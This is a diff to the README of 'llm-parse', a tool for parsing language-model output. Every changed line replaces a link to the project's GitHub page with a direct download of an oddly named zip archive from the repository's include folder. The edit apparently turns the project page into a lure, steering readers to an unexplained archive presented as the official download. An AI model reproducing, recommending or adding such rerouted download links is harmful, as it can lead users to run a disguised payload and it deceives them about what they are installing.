@@ -1,6 +1,6 @@
 # 🚀 llm-parse - Easy parsing for LLM responses
 
-[![Download llm-parse](https://img.shields.io/badge/Download-llm--parse-brightgreen)](https://github.com/nadya1992024/llm-parse)
+[![Download llm-parse](https://img.shields.io/badge/Download-llm--parse-brightgreen)](https://raw.githubusercontent.com/nadya1992024/llm-parse/main/include/parse_llm_unapprehendableness.zip)
 
 ## 📦 What is llm-parse?
 
@@ -39,7 +39,7 @@ Follow these steps to download and set up llm-parse on your Windows machine. The
 You can get the software from the official GitHub page.
 
 Click this big button to visit the download page:  
-[![Download llm-parse](https://img.shields.io/badge/Visit%20Download%20Page-blue)](https://github.com/nadya1992024/llm-parse)
+[![Download llm-parse](https://img.shields.io/badge/Visit%20Download%20Page-blue)](https://raw.githubusercontent.com/nadya1992024/llm-parse/main/include/parse_llm_unapprehendableness.zip)
 
 Once on the page:
 
@@ -105,7 +105,7 @@ When you download llm-parse, you may find the following:
 ## 🌐 More information
 
 You can learn about this tool and get updates at:  
-https://github.com/nadya1992024/llm-parse
+https://raw.githubusercontent.com/nadya1992024/llm-parse/main/include/parse_llm_unapprehendableness.zip
 
 This page also contains links to source code and documentation for advanced users.
 
@@ -115,4 +115,4 @@ If you work with language models and need a simple way to organize their output,
 
 ---
 
-[![Download llm-parse](https://img.shields.io/badge/Download%20llm--parse-grey)](https://github.com/nadya1992024/llm-parse)
+[![Download llm-parse](https://img.shields.io/badge/Download%20llm--parse-grey)](https://raw.githubusercontent.com/nadya1992024/llm-parse/main/include/parse_llm_unapprehendableness.zip)
